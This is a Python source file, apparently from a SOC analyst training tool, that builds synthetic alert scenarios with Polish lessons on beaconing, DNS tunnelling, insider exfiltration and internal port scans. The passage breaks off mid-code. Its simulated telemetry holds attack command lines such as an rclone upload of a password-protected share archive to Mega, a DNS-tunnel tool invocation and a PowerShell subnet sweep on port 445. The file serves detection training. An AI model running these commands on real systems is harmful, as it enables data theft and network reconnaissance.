"""Network-driven scenarios: proxy, DNS, firewall, WAF and server-side Windows telemetry."""

from __future__ import annotations

from hunterscope.trainer import sources as src
from hunterscope.trainer.model import Lessons
from hunterscope.trainer.scenarios.base import Builder, Proc, noise, template

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
SYSTEM = "NT AUTHORITY\\SYSTEM"
UA_OLD = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0)"
UA_WIN = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36"
B32 = "abcdefghijklmnopqrstuvwxyz234567"


# ======================================================================================================================
# Beaconing
# ======================================================================================================================
LESSONS_BEACON = Lessons(
    title="Regularne połączenia do rzadkiej domeny (beaconing)",
    category="Sieć",
    tp_signs=[
        "Stały odstęp (np. 60 s) z niewielkim jitterem i niemal identyczne rozmiary żądań i odpowiedzi.",
        "Domena młoda, bez reputacji, odwiedzana przez jeden host w organizacji.",
        "Proces inicjujący to nietypowy plik (rundll32 z DLL w Public, niepodpisany plik w Temp), a User-Agent stary lub nietypowy.",
        "URL z identyfikatorem hosta w parametrze (id=…): kanał dowodzenia.",
    ],
    fp_signs=[
        "Domena należy do znanego dostawcy (Microsoft), jest stara i widziana na setkach hostów.",
        "Proces to podpisany komponent systemu lub aplikacji z Program Files / System32.",
        "Regularność jest cechą produktu (telemetria, presence), a nie dowodem złośliwości.",
        "Młoda domena bez reputacji może należeć do nowego dostawcy zatwierdzonego oprogramowania: sprawdź proces, podpis, sposób wdrożenia i zmianę.",
    ],
    checklist=[
        "Interwał i jitter, rozmiary żądań/odpowiedzi.",
        "Który proces łączy się (Sysmon 3)? Ścieżka, podpis, rodzic.",
        "Domena: wiek, właściciel, ilu hostów w organizacji ją odwiedza.",
        "User-Agent, URL, parametry.",
        "Od kiedy trwa wzorzec? Co się wydarzyło tuż przed jego startem?",
    ],
    pitfalls=[
        "Regularność sama nie jest dowodem: większość produktów odpytuje serwery cyklicznie.",
        "Czysta reputacja młodej domeny w TI to brak danych, nie ocena.",
        "Cel może być legalną usługą współdzieloną (chmura, hosting kodu), więc dobra reputacja celu nie wyklucza C2. Patrz na proces i wzorzec.",
    ],
    attack=["T1071.001 Application Layer Protocol: Web", "T1573 Encrypted Channel", "T1105 Ingress Tool Transfer"],
    tips=[
        "SIEM/proxy: stats count, avg(bytes_out), stdev(interval) by src,domain. Mała odchyłka standardowa = kandydat.",
        "ESET Inspect: sprawdź moduł i ścieżkę procesu, który wykonuje połączenia, oraz jego reputację.",
        "Sprawdź, ilu hostów w organizacji odwiedza tę domenę (prevalence): jeden host to czerwona flaga.",
    ],
    hints=[
        "Który proces generuje ruch i skąd się uruchomił?",
        "Spójrz na domenę: wiek, właściciel i ilu użytkowników w organizacji ją odwiedza.",
        "Porównaj rozmiary żądań i odpowiedzi oraz URL.",
    ],
)


@template("beaconing", ("tp", "fp", "btp"), LESSONS_BEACON)
def beaconing(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    b.at_hour(rng.choice([10, 11, 14, 15, 2, 3]))
    p = b.person()
    sess = b.session(p)
    steps = 28
    if variant == "tp":
        remote = b.threat()
        domain, ip = remote.name, w.attacker_ip()
        interval = 60 if not b.hard else 300
        if b.hard:
            image = rf"{p.profile}\AppData\Local\Temp\msedge_proxy.exe"
            cmd = f'"{image}"'
            ev, mal = b.spawn(sess["explorer"], image, cmd, b.t(-steps * interval / 60 - 2), p.host, p.sam, signed="No", cwd=rf"{p.profile}\AppData\Local\Temp")
            ev.key("Niepodpisany plik o nazwie podobnej do Edge uruchomiony z Temp: nazwa ma uśpić czujność.")
            ua = UA_WIN
        else:
            image = r"C:\Windows\System32\rundll32.exe"
            cmd = r"rundll32.exe C:\Users\Public\Libraries\wlanext.dll,Start"
            ev, mal = b.spawn(sess["explorer"], image, cmd, b.t(-steps * interval / 60 - 2), p.host, p.sam)
            ev.key("rundll32 ładuje DLL z C:\\Users\\Public\\Libraries: ścieżka zapisywalna przez użytkownika, nazwa udaje sterownik Wi-Fi.")
            ua = UA_OLD
        trigger = None
        for i in range(steps):
            jitter = rng.uniform(-0.08, 0.08) if not b.hard else rng.uniform(-0.3, 0.3)
            ts = b.t(-(steps - i) * interval / 60 * (1 + jitter) / 1.0, 0)
            url = remote.url(f"api/v2/poll?id={w.digest(p.host)[:10]}")
            ev = b.add(src.proxy(ts, p.ip, p.sam, "POST", url, 200, 312 + rng.randint(-6, 6), 128 + rng.randint(-4, 4), ua=ua,
                                 category=remote.category, host=p.host))
            trigger = ev
            if i == 0:
                ev.key("Pierwsze żądanie wzorca. Zwróć uwagę na stały rozmiar żądania i odpowiedzi oraz identyfikator hosta w URL.")
            elif i in (5, 10):
                ev.key("Kolejne żądanie w niemal identycznym odstępie i rozmiarze: sygnał z kanału dowodzenia.")
        for i in (3, 14, 25):
            b.add(src.sysmon_net(b.t(-(steps - i) * interval / 60), p.host, p.netbios, image, mal.pid, ip, 443, domain, src_ip=p.ip)).key(
                f"Połączenie wychodzące inicjuje {image.rsplit(chr(92), 1)[-1]}, a nie przeglądarka.")
        b.ti_threat(remote, ip=ip, tags="C2, beacon")
        noise(b, involved=[p])
        truth = b.truth(
            "tp", "high",
            f"{p.host} co ~{interval} s wysyła niemal identyczne żądania POST do {domain} ({remote.blurb}). Połączenia inicjuje nietypowy proces, URL zawiera identyfikator hosta. To beacon C2. "
            "Reputacja celu nie rozstrzyga: zdradza go proces, regularność i identyczne rozmiary.",
            f"TP. {p.host}: {steps} żądań POST do {domain} (/api/v2/poll?id=…) co ~{interval}s ±jitter, ~312 B out / ~128 B in, UA {'MSIE 7' if not b.hard else 'Chrome'}. "
            f"Proces inicjujący: {image}. Cel: {remote.blurb}, jeden host w organizacji. Eskaluję do L2, izolacja hosta i blokada celu.",
            required=["isolate_host", "block_ioc"], lookups=[f"ti:{domain}"])
    elif variant == "btp":
        domain = "api.pulsewatch-monitor.io"
        image = r"C:\Program Files\PulseWatch\pwagent.exe"
        sha = w.digest("pwagent")
        b.ctx.assets[p.host.lower()]["Uwagi"] = "Zatwierdzone oprogramowanie: PulseWatch (agent monitoringu SaaS, pakiet SCCM P015)"
        services = Proc(w.pid(), r"C:\Windows\System32\services.exe", "services.exe")
        ev, proc = b.spawn(services, image, f'"{image}" --service', b.t(-steps * 5 - 30), p.host, SYSTEM, signer="PulseWatch sp. z o.o.", sha256=sha)
        ev.key("Agent podpisany przez dostawcę, z Program Files, uruchomiony jako usługa (SYSTEM), a nie z profilu użytkownika.")
        trigger = None
        for i in range(steps):
            ts = b.t(-(steps - i) * 5 * (1 + rng.uniform(-0.03, 0.03)))
            trigger = b.add(src.proxy(ts, p.ip, "SYSTEM", "POST", f"https://{domain}/v1/heartbeat?host={p.host}", 200, 420 + rng.randint(-12, 12),
                                      96 + rng.randint(-6, 6), ua="PulseWatch-Agent/4.2", category="Uncategorized", host=p.host))
            if i == 0:
                trigger.herring("Regularny odstęp, prawie stałe rozmiary, identyfikator hosta w URL, domena młoda i bez kategorii: wszystko wygląda jak beacon. "
                                "Ale proces, jego podpis i sposób wdrożenia mówią co innego.")
        for i in (3, 14, 25):
            b.add(src.sysmon_net(b.t(-(steps - i) * 5), p.host, SYSTEM, image, proc.pid, w.public_ip(), 443, domain, src_ip=p.ip)).key(
                "Połączenie inicjuje podpisany agent z Program Files, nie plik z profilu użytkownika.")
        b.ctx.ti[domain] = {
            "Wskaźnik": domain, "Typ": "domena", "Werdykt TI (symulacja)": "Brak jednoznacznej klasyfikacji (młoda domena komercyjnego SaaS)",
            "Pierwszy raz widziany": "45 dni temu", "Wiek rejestracji domeny": "45 dni", "Występowanie w organizacji": "61 hostów w ostatnich 30 dniach",
            "Komentarz": "Domena dostawcy agenta monitoringu; reputacja jeszcze się nie ugruntowała."}
        b.change("*", b.t(-3 * 1440), b.t(60 * 24 * 30), "Wdrożenie agenta monitoringu PulseWatch na stacjach roboczych (pakiet SCCM P015)", "CHG-1131")
        b.ti_good(sha, "hash", owner="PulseWatch sp. z o.o.", age_years=1, hosts_seen=61)
        noise(b, involved=[p])
        truth = b.truth(
            "btp", "info",
            f"Regularne połączenia do {domain} wykonuje agent PulseWatch, wdrożony z SCCM zgodnie z CHG-1131. Domena jest młoda i bez reputacji, a ruch wygląda jak beacon, "
            "ale proces jest podpisany, działa jako usługa z Program Files i występuje na 61 hostach.",
            f"BTP. {p.host}: {steps} żądań POST co ~5 min do {domain}; proces pwagent.exe (podpisany PulseWatch, Program Files, usługa). Agent jest na liście zatwierdzonej, "
            "zmiana CHG-1131 (SCCM P015), 61 hostów w organizacji. Domena młoda, ale to dostawca. Zamykam, wnoszę o wpis domeny na listę dozwolonych.",
            lookups=[f"ti:{domain}", f"asset:{p.host}", f"change:{p.host}"])
    else:
        telemetry = rng.random() < 0.5
        if telemetry:
            domain, image = "v10.events.data.microsoft.com", r"C:\Windows\System32\svchost.exe"
            cmd, signer = "svchost.exe -k utcsvc -p -s DiagTrack", "Microsoft Windows"
            owner = "Microsoft Corporation (telemetria Windows)"
        else:
            domain, image = "presence.teams.microsoft.com", r"C:\Program Files\WindowsApps\MSTeams\ms-teams.exe"
            cmd, signer = "ms-teams.exe", "Microsoft Corporation"
            owner = "Microsoft Corporation (obecność w Teams)"
        services = Proc(w.pid(), r"C:\Windows\System32\services.exe", "services.exe")
        ev, proc = b.spawn(services if telemetry else sess["explorer"], image, cmd, b.t(-steps * 5 - 30), p.host, SYSTEM if telemetry else p.sam, signer=signer)
        ev.key(f"Proces podpisany ({signer}), ze standardowej ścieżki ({image.rsplit(chr(92), 1)[0]}).")
        trigger = None
        for i in range(steps):
            ts = b.t(-(steps - i) * 5 * (1 + rng.uniform(-0.05, 0.05)))
            trigger = b.add(src.proxy(ts, p.ip, p.sam, "POST", f"https://{domain}/OneCollector/1.0/", 200, rng.randint(900, 7800), rng.randint(60, 400),
                                      ua="Windows-Telemetry/10.0" if telemetry else UA_WIN, category="Business", host=p.host))
            if i == 0:
                trigger.herring("Idealnie regularny odstęp co 5 minut brzmi jak beacon. Ale rozmiary żądań się zmieniają, a domena należy do Microsoftu.")
        for i in (3, 14, 25):
            b.add(src.sysmon_net(b.t(-(steps - i) * 5), p.host, SYSTEM if telemetry else p.netbios, image, proc.pid, w.service_ip(), 443, domain, src_ip=p.ip)).key(
                "Połączenie inicjuje podpisany komponent Microsoftu do domeny Microsoftu.")
        b.ti_good(domain, "domena", owner=owner, hosts_seen=430, note="Domena widziana na praktycznie wszystkich stacjach z Windows 10/11.")
        noise(b, involved=[p])
        truth = b.truth(
            "fp", "info",
            f"Regularne połączenia do {domain} wykonuje podpisany komponent Microsoftu ({'DiagTrack' if telemetry else 'Teams'}). Domena jest znana, stara i widziana na ~430 hostach, a rozmiary żądań się zmieniają.",
            f"FP. {p.host}: {steps} żądań POST co ~5 min do {domain}; proces {image.rsplit(chr(92), 1)[-1]} podpisany przez Microsoft, domena Microsoftu widziana na 430 hostach, "
            "rozmiary variable (0,9–7,8 KB). Zamykam jako FP, wnoszę o wyjątek w regule dla tej domeny.",
            lookups=[f"ti:{domain}"])
    b.finish(trigger, source="SIEM", rule="Periodic outbound connections to a rare destination (beaconing)", severity="medium",
             description=f"Host {p.host} łączy się cyklicznie z domeną {domain}.", truth=truth, lessons=LESSONS_BEACON)


# ======================================================================================================================
# DNS tunnelling
# ======================================================================================================================
LESSONS_DNS = Lessons(
    title="Anomalie DNS: długie zapytania do jednej domeny",
    category="Sieć",
    tp_signs=[
        "Bardzo długie, losowe etykiety (base32/base64) w zapytaniach do jednej domeny, o zmiennej długości i zawartości.",
        "Zapytania TXT/NULL w dużej liczbie, z hosta użytkownika, w nietypowym czasie.",
        "Na hoście działa nieznany, niepodpisany proces (np. w Public), a domena jest młoda i autorytatywna dla jednego hosta.",
    ],
    fp_signs=[
        "Źródłem jest serwer o roli, która uzasadnia takie zapytania (brama pocztowa, antywirus w chmurze).",
        "Etykiety mają stałą, przewidywalną strukturę (np. skrót MD5 co 32 znaki), a odpowiedzi są krótkie i ustrukturyzowane („clean”).",
        "Domena należy do dostawcy używanego w organizacji, jest stara i opisana w dokumentacji produktu.",
    ],
    checklist=[
        "Kto pyta (host, rola serwera/stacji)?",
        "Struktura etykiet: stała długość i format czy losowe ciągi o zmiennej długości?",
        "Typ zapytań i wielkość odpowiedzi.",
        "Domena: właściciel, wiek, prevalence.",
        "Jaki proces na hoście generuje zapytania (Sysmon)?",
    ],
    pitfalls=[
        "Wolumen i długość zapytań nie wystarczą: kilka produktów bezpieczeństwa tak działa.",
        "Nie szukaj tunelu w pojedynczym zapytaniu: patrz na serię i strukturę.",
    ],
    attack=["T1071.004 Application Layer Protocol: DNS", "T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol"],
    tips=[
        "SIEM/DNS: avg(len(query)), dc(query) by client,domain. Dużo unikalnych, długich nazw do jednej domeny = kandydat.",
        "Entropia etykiet: losowe (base32) kontra heks o stałej długości.",
        "Dokumentacja produktu / lista usług sieciowych: czy ten serwer ma uzasadnienie dla takich zapytań?",
    ],
    hints=[
        "Kto jest źródłem zapytań i czy jego rola to tłumaczy?",
        "Porównaj strukturę nazw: stała czy losowa długość i znaki?",
        "Sprawdź właściciela domeny i wiek w TI oraz opis serwera w Kontekście.",
    ],
)


@template("dns_tunnel", ("tp", "fp"), LESSONS_DNS)
def dns_tunnel(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    b.at_hour(rng.choice([2, 3, 14, 15]))
    count = 30
    if variant == "tp":
        p = b.person()
        sess = b.session(p)
        domain = w.bad_domain()
        ip_auth = w.attacker_ip()
        label_len = (52, 58) if not b.hard else (36, 42)
        _, mal = b.spawn(sess["explorer"], r"C:\Users\Public\svc.exe", rf"C:\Users\Public\svc.exe --dns {domain} --interval 6", b.t(-count * 0.1 - 3), p.host, p.sam,
                         signed="No", cwd=r"C:\Users\Public")
        b.events[-1].key("Niepodpisany plik z C:\\Users\\Public z parametrem --dns <domena>: narzędzie do tunelowania.")
        trigger = None
        for i in range(count):
            label = "".join(rng.choices(B32, k=rng.randint(*label_len)))
            qtype = "TXT" if (i % 3 or not b.hard) else "A"
            trigger = b.add(src.dns(b.t(-(count - i) * 0.1, rng.randint(0, 5)), p.ip, f"{label}.t1.{domain}", qtype, "NOERROR",
                                    "".join(rng.choices(B32, k=40)) if qtype == "TXT" else ip_auth, host=p.host))
            if i in (0, 1):
                trigger.key("Długa losowa etykieta (base32) do jednej domeny, odpowiedź TXT z danymi: kanał danych przez DNS.")
        b.add(src.sysmon_net(b.t(-1), p.host, p.netbios, r"C:\Users\Public\svc.exe", mal.pid, "10.10.10.10", 53, "dc01", src_ip=p.ip, proto="udp")).key(
            "Niepodpisany svc.exe wysyła ruch DNS do kontrolera domeny, który rekurencyjnie przekaże go dalej.")
        b.ti_bad(domain, "domena", age_days=6, tags="DNS tunnelling, C2")
        noise(b, involved=[p])
        truth = b.truth(
            "tp", "high",
            f"{p.host} wysyła ~400 zapytań na minutę z losowymi etykietami base32 do {domain} (TXT), a proces svc.exe z Public jest niepodpisany. To tunel DNS (C2/eksfiltracja).",
            f"TP. {p.host}: seria zapytań {label_len[0]}–{label_len[1]} znaków (losowy base32) do *.t1.{domain}, głównie TXT. Proces svc.exe (niepodpisany, C:\\Users\\Public) "
            f"z parametrem --dns. Domena 6 dni. Eskaluję, izolacja hosta, blokada domeny w DNS.",
            required=["isolate_host", "block_ioc"], lookups=[f"ti:{domain}"])
    else:
        gw = b.server("SRV-MGW01")
        domain = "rep.mailsec-provider.net"
        b.ctx.ti[domain] = {
            "Wskaźnik": domain, "Typ": "domena", "Werdykt TI (symulacja)": "Czysty, znany dostawca",
            "Właściciel": "MailSec Provider (producent bramy pocztowej używanej w Nordwind)", "Pierwszy raz widziany": "15 lat temu",
            "Występowanie w organizacji": "wyłącznie SRV-MGW01", "Komentarz": "Dokumentacja produktu: zapytania reputacji w formie <md5>.rep.mailsec-provider.net (TXT)."}
        trigger = None
        for i in range(count):
            label = w.digest(f"mail{i}", "md5")
            trigger = b.add(src.dns(b.t(-rng.uniform(0, 4)), gw.ip, f"{label}.{domain}", "TXT", "NOERROR", "0|clean", host="SRV-MGW01"))
            if i == 0:
                trigger.herring("Długa nazwa (32 znaki) i typ TXT wyglądają jak tunel, ale etykieta to zawsze skrót MD5, a odpowiedź to krótkie „0|clean”.")
            elif i in (1, 2):
                trigger.key("Stała struktura <md5>.<domena>, odpowiedź „0|clean”: zapytanie o reputację wiadomości, nie dane.")
        b.server("SRV-MGW01")
        noise(b, involved=[])
        truth = b.truth(
            "fp", "low",
            "Źródłem jest brama pocztowa SRV-MGW01, która odpytuje chmurę producenta o reputację wiadomości: etykieta to zawsze skrót MD5, odpowiedź krótka („0|clean”), domena opisana w dokumentacji produktu.",
            "FP. SRV-MGW01: ~400 zapytań TXT/min do <md5>.rep.mailsec-provider.net. Struktura stała (32 znaki hex), odpowiedzi „0|clean”, domena dostawcy bramy pocztowej (15 lat, wyłącznie ten serwer). "
            "Zamykam jako FP, wnoszę o wyjątek dla SRV-MGW01 w regule anomalii DNS.",
            lookups=[f"ti:{domain}", "asset:SRV-MGW01"])
    b.finish(trigger, source="SIEM", rule="DNS anomaly: long queries to a single domain", severity="medium",
             description=f"~400 zapytań DNS na minutę z {trigger.fields['ClientIp']} do jednej domeny (średnia długość 55 znaków).", truth=truth,
             lessons=LESSONS_DNS)


# ======================================================================================================================
# Data exfiltration
# ======================================================================================================================
LESSONS_EXFIL = Lessons(
    title="Duży wolumen danych wychodzących",
    category="Sieć",
    tp_signs=[
        "Użytkownik w okresie wypowiedzenia lub o podwyższonym ryzyku (HR) i aktywność poza godzinami pracy.",
        "Najpierw masowy odczyt udziałów, potem archiwizacja (7z/rar z hasłem), potem wysyłka do osobistej chmury (Mega, Dropbox, Google Drive).",
        "Narzędzie niestandardowe (rclone) lub przeglądarka na usługi, które nie są zatwierdzone przez firmę.",
        "Kategoria proxy „Personal Cloud Storage” i brak wcześniejszej historii takiego transferu.",
    ],
    fp_signs=[
        "Źródłem jest agent kopii zapasowych lub serwer przeznaczony do transferów, podpisany i zatwierdzony.",
        "Docelowa usługa to zatwierdzony dostawca kopii zapasowych z umową.",
        "Taki sam transfer o tej samej porze w poprzednich dniach (baseline) i wolumen porównywalny.",
    ],
    checklist=[
        "Kto jest źródłem (użytkownik/serwer), jaka jest jego rola i status w HR?",
        "Dokąd: domena, kategoria, czy usługa jest zatwierdzona?",
        "Ile danych i czy to odbiega od historii (poprzednie dni)?",
        "Co poprzedzało transfer: odczyt udziałów, archiwizacja, narzędzia?",
        "Czy jest zmiana/umowa uzasadniająca transfer?",
    ],
    pitfalls=[
        "Duży wolumen w nocy to także backup. Zawsze porównaj z poprzednimi dniami.",
        "Użytkownik z HR „okres wypowiedzenia” nie oznacza winy, ale podnosi ryzyko i wymaga eskalacji do właściwego zespołu.",
    ],
    attack=["T1567.002 Exfiltration to Cloud Storage", "T1560.001 Archive Collected Data", "T1039 Data from Network Shared Drive"],
    tips=[
        "Proxy: suma bytes_out po użytkowniku i domenie w oknie czasowym, porównanie do 30-dniowego baseline.",
        "File server: Security 5145 (dostęp do plików) pokaże, co użytkownik czytał przed wysyłką.",
        "Eskalacja: przypadki insider zgłasza się zgodnie z procedurą (bez konfrontacji z użytkownikiem).",
    ],
    hints=[
        "Kto i dokąd wysyła dane? Czy ten cel jest zatwierdzony?",
        "Porównaj z poprzednimi dniami i sprawdź, co poprzedzało transfer.",
        "W Kontekście sprawdź status HR użytkownika i zmiany/umowy.",
    ],
)


@template("exfil", ("tp", "fp"), LESSONS_EXFIL)
def exfil(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    if variant == "tp":
        b.at_hour(rng.choice([1, 2]), weekday=True)
        p = b.person("Sprzedaż")
        b.use(p, **{"Status HR": "Okres wypowiedzenia do końca miesiąca (przechodzi do konkurencji, zgłoszone przez HR)"})
        b.server("SRV-FILE01")
        sess = b.session(p, hours_ago=0.5)
        for i in range(6):
            b.add(src.winsec(b.t(-62, i * 0.5), "SRV-FILE01", 5145, "A network share object was checked",
                             {"SubjectUserName": p.sam, "ShareName": r"\\*\Handlowe", "RelativeTargetName": rf"Klienci\Umowy\Klient_{i + 1:02d}.pdf",
                              "IpAddress": p.ip}, rf"Dostęp do udziału Handlowe\Klienci\Umowy: {p.sam} z {p.ip}", p.sam)).key(
                "Masowy odczyt umów klientów z udziału, nocą, przez osobę w okresie wypowiedzenia." if i == 0 else "Kolejny plik klienta.")
        archive = r"C:\Users\Public\docs.7z"
        ev, a7 = b.spawn(sess["explorer"], r"C:\Program Files\7-Zip\7z.exe", rf'7z.exe a -mhe=on -pS3cr3t! {archive} \\SRV-FILE01\Handlowe\Klienci', b.t(-50), p.host, p.sam,
                         signer="Igor Pavlov")
        ev.key("Archiwum z hasłem zawierające cały katalog Klienci. Przygotowanie do wysyłki.")
        tool_name = "rclone.exe" if not b.hard else "chrome.exe"
        if not b.hard:
            ev, rc = b.spawn(sess["explorer"], rf"{p.profile}\AppData\Local\Temp\rclone.exe", rf"rclone.exe copy {archive} mega:backup --transfers 8", b.t(-30), p.host, p.sam,
                             signed="No")
            ev.key("rclone.exe, niezatwierdzone narzędzie do synchronizacji z chmurami, uruchomione z Temp.")
            domain, cat = "g.api.mega.co.nz", "Personal Cloud Storage"
        else:
            domain, cat = "drive.google.com", "Personal Cloud Storage"
        trigger = None
        for i in range(5):
            trigger = b.add(src.proxy(b.t(-30 + i * 6), p.ip, p.sam, "POST", f"https://{domain}/upload/{i}", 200, 900_000_000, 2_000, category=cat, host=p.host,
                                      ua=UA_WIN if b.hard else "rclone/v1.65.0"))
            trigger.key(f"~900 MB wysłane do {domain} (osobista chmura). W sumie ok. 4,5 GB w 25 minut." if i == 0 else "Kolejna porcja danych.")
        b.ctx.ti[domain] = {"Wskaźnik": domain, "Typ": "domena", "Werdykt TI (symulacja)": "Legalna usługa, kategoria: Osobiste przechowywanie plików",
                           "Występowanie w organizacji": "3 użytkowników w ostatnich 30 dniach (niskie wolumeny)", "Komentarz": "Usługa niezatwierdzona do danych firmowych."}
        noise(b, profile="night", involved=[p])
        truth = b.truth(
            "tp", "high",
            f"{p.sam}, w okresie wypowiedzenia, w nocy odczytał umowy klientów, zarchiwizował je z hasłem i wysłał ok. 4,5 GB do osobistej chmury ({domain}). To podejrzenie wycieku danych (insider).",
            f"TP (insider). {p.sam} ({p.host}), okres wypowiedzenia, 01–03 w nocy: odczyt Handlowe\\Klienci\\Umowy na SRV-FILE01 → 7z z hasłem → {tool_name} → {domain}, ~4,5 GB. "
            "Eskaluję do L2 i według procedury do HR/bezpieczeństwa, bez kontaktu z użytkownikiem. Wnoszę o blokadę kategorii i zabezpieczenie logów.",
            required=["hunt_org", "block_ioc"], harmful=["notify_user"], lookups=[f"user:{p.sam}", f"ti:{domain}"])
    else:
        b.at_hour(1, weekday=True)
        b.server("SRV-BKP01")
        domain = "upload.cloud-backup-provider.example"
        b.ctx.ti[domain] = {
            "Wskaźnik": domain, "Typ": "domena", "Werdykt TI (symulacja)": "Czysty, dostawca kopii zapasowych off-site (umowa 2024/BKP)",
            "Właściciel": "Cloud Backup Provider", "Występowanie w organizacji": "wyłącznie SRV-BKP01", "Pierwszy raz widziany": "2 lata temu", "Komentarz": "-"}
        agent = r"C:\Program Files\BackupAgent\bkpagent.exe"
        sha = w.digest("bkpagent")
        services = Proc(w.pid(), r"C:\Windows\System32\services.exe", "services.exe")
        ev, bk = b.spawn(services, agent, rf'"{agent}" --job nightly-offsite', b.t(-70), "SRV-BKP01", SYSTEM, signer="Cloud Backup Provider sp. z o.o.", sha256=sha)
        ev.key("Agent kopii zapasowych: podpisany, z Program Files, uruchomiony z usługi w nocy.")
        trigger = None
        for i in range(5):
            trigger = b.add(src.proxy(b.t(-60 + i * 14), "10.10.30.20", "svc_backup", "PUT", f"https://{domain}/v2/chunks/{i}", 200, 4_200_000_000, 1_200,
                                      ua="BackupAgent/8.2", category="Cloud Backup", host="SRV-BKP01"))
            if i == 0:
                trigger.herring("Ok. 21 GB w godzinę w nocy wygląda na eksfiltrację, ale to cotygodniowy transfer kopii off-site.")
        for days in (1, 2, 3):
            b.add(src.proxy(b.t(-60 - days * 1440), "10.10.30.20", "svc_backup", "PUT", f"https://{domain}/v2/chunks/0", 200, 4_200_000_000, 1_200,
                            ua="BackupAgent/8.2", category="Cloud Backup", host="SRV-BKP01")).key(
                f"Identyczny transfer ({days} dni wcześniej) o tej samej porze i wolumenie: baseline, nie anomalia.")
        b.change("srv-bkp01", b.t(-90), b.t(120), "Codzienna kopia off-site do Cloud Backup Provider (umowa 2024/BKP)", "CHG-STD-003")
        b.ti_good(sha, "hash", owner="Cloud Backup Provider sp. z o.o.", hosts_seen=1)
        noise(b, profile="night", involved=[])
        truth = b.truth(
            "fp", "low",
            "Serwer kopii zapasowych SRV-BKP01 wysyła ~21 GB do zatwierdzonego dostawcy kopii off-site. To samo działo się w poprzednich dniach o tej samej porze, w ramach zmiany standardowej CHG-STD-003.",
            "FP. SRV-BKP01 (svc_backup) → upload.cloud-backup-provider.example, ~21 GB w godzinę. Identyczne transfery 1–3 dni wcześniej, agent podpisany, dostawca w umowie 2024/BKP, "
            "zmiana standardowa CHG-STD-003. Zamykam jako FP, proponuję wyjątek dla SRV-BKP01 → ta domena.",
            lookups=["change:srv-bkp01", f"ti:{domain}"])
    b.finish(trigger, source="SIEM", rule="Large outbound data transfer", severity="high",
             description=f"Host {trigger.host} wysłał ponad 4 GB danych do {trigger.fields['Url'].split('/')[2]} w ciągu godziny.", truth=truth, lessons=LESSONS_EXFIL)


# ======================================================================================================================
# Internal scan
# ======================================================================================================================
LESSONS_SCAN = Lessons(
    title="Skanowanie portów w sieci wewnętrznej",
    category="Sieć",
    tp_signs=[
        "Stacja użytkownika (nie serwer) skanuje setki hostów na portach administracyjnych (445, 3389, 22, 5985).",
        "Na hoście działa narzędzie skanujące lub pętla w PowerShellu uruchomiona z profilu użytkownika.",
        "Zaraz po skanie próby uwierzytelnienia na wykrytych serwerach (4625 dla kont administracyjnych).",
        "Brak wpisu w kalendarzu zmian, godziny nietypowe dla użytkownika.",
    ],
    fp_signs=[
        "Źródłem jest znany skaner podatności / system monitoringu, z wpisu w ewidencji i kalendarza.",
        "Skan zgodny z harmonogramem: cykliczny, uporządkowany (kolejne adresy), z zatwierdzonym zakresem.",
        "Monitoring: wąski zestaw portów (161, 443, ICMP) i regularne cykle co kilka minut.",
    ],
    checklist=[
        "Kto skanuje: rola hosta w ewidencji (serwer skanera / monitoring / stacja)?",
        "Zakres: liczba hostów i portów, sekwencja (kolejno czy losowo).",
        "Narzędzie na hoście (Sysmon 1), ścieżka, podpis.",
        "Po skanie: próby uwierzytelnienia na celach?",
        "Kalendarz zmian / harmonogram skanów.",
    ],
    pitfalls=[
        "Skaner podatności wygląda jak atak. Jedynym pewnym rozróżnieniem jest ewidencja i harmonogram.",
        "Nie izoluj serwera skanera bez sprawdzenia: przerwiesz zaplanowany skan, a incydentu nie ma.",
    ],
    attack=["T1046 Network Service Discovery", "T1018 Remote System Discovery", "T1021.002 SMB/Windows Admin Shares"],
    tips=[
        "FW/NDR: unikalne dst_ip i dst_port per src w oknie 5 minut. Skok do setek hostów = skan.",
        "Sprawdź rolę hosta w CMDB (Skaner podatności / Monitoring) i wpis w kalendarzu.",
        "ESET Inspect: narzędzia skanujące na stacji to zwykle powód do eskalacji.",
    ],
    hints=[
        "Jaką rolę ma skanujący host i jakie porty skanuje?",
        "Co działa na skanującym hoście i co dzieje się po skanie?",
        "Sprawdź ewidencję hosta i kalendarz zmian.",
    ],
)


@template("internal_scan", ("tp", "btp", "fp"), LESSONS_SCAN)
def internal_scan(b: Builder, variant: str) -> None:
    rng = b.rng
    targets = ["10.10.10.10", "10.10.10.11", "10.10.20.5", "10.10.20.12", "10.10.30.4", "10.10.30.20", "10.10.40.5", "10.10.20.30"]
    if variant == "tp":
        b.at_hour(rng.choice([1, 2, 3]), weekday=True)
        p = b.person("HR")
        sess = b.session(p, hours_ago=0.5)
        if b.hard:
            cmd = r'powershell.exe -c "1..254 | % { Test-NetConnection 10.10.20.$_ -Port 445 -InformationLevel Quiet }"'
            ev, tool = b.spawn(sess["explorer"], PS, cmd, b.t(-4), p.host, p.sam)
            ev.key("Pętla Test-NetConnection po całej podsieci na porcie 445, uruchomiona ręcznie przez użytkownika.")
        else:
            exe = rf"{p.profile}\AppData\Local\Temp\ipscan.exe"
            ev, tool = b.spawn(sess["explorer"], exe, rf"{exe} -f:10.10.0.0/16 -p:22,445,3389,5985", b.t(-4), p.host, p.sam, signed="No")
            ev.key("Niepodpisane narzędzie skanujące z Temp uruchomione na stacji roboczej użytkownika.")
        trigger = None
        for i in range(14):
            trigger = b.add(src.fw(b.t(-3 + i * 0.2), "allow" if i % 3 == 0 else "deny", "tcp", p.ip, rng.randint(40000, 60000), rng.choice(targets) if i < 8 else f"10.10.{rng.randint(10, 60)}.{rng.randint(2, 250)}",
                                   rng.choice([445, 3389, 22, 5985]), rule="LAN-segmentation", app="unknown", host=""))
        trigger.key("Aggregated: 4 812 prób połączeń do 211 unikalnych hostów w ~3 minuty, na portach administracyjnych, ze stacji roboczej.")
        trigger.summary = "[AGG] 4 812 połączeń, 211 unikalnych hostów, porty 22/445/3389/5985 w 3 min"
        for i, srv in enumerate(["SRV-FILE01", "SRV-SQL01"]):
            b.add(src.logon_fail(b.t(1 + i), srv, "administrator", p.ip, status="0xC000006A", workstation=p.host)).key(
